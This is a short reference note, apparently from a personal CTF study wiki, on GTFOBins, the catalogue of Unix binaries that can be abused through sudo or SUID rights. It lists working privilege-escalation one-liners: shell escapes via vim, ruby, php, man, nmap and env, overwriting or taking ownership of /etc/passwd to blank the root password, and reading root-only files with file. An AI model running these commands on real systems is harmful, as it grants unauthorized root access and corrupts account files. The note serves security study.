---
type: tool
category: reference
related: [[sudo-abuse]], [[suid-enumeration]]
---

# GTFOBins

Curated list of Unix binaries that can be abused to break out of restricted contexts (sudo/SUID).

## How it's used

After `sudo -l` or a SUID scan reveals an allowed binary (e.g. `vim`, `ruby`), look it up to get a ready-made shell payload.

## Example payloads

```sh
sudo vim -c ':!/bin/sh' /dev/null
sudo ruby -e 'exec "/bin/sh"'
sudo -u <user> /sbin/debugfs -w <image>   # then: debugfs: !/bin/bash
sudo -u <user> man man                    # then: !/bin/bash
sudo -u <user> nmap --script=/tmp/x.nse   # NSE os.execute("/bin/sh")
sudo chown $(id -u):$(id -g) /etc/passwd  # own passwd → blank root password
env /bin/sh -p                            # SUID env → root shell
sudo dos2unix -f -n /tmp/passwd.new /etc/passwd  # overwrite passwd → blank root
sudo php -r 'system("/bin/sh -i")'        # sudo php → shell
sudo env /bin/bash                         # sudo env → root shell
sudo vim -c ':!/bin/bash'                  # sudo vim → shell
sudo file -f /root/secret.txt             # file-read: each line echoed in the error output
```

- Not every entry is a **shell**: `file`'s GTFOBins page has a *file-read* function — a sudo-allowed reader of a root-only file leaks its contents (and with them, often a password) even though you never get code execution ([[dance-samba]], [[sudo-abuse]]).

## Seen in

[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[dance-samba]]
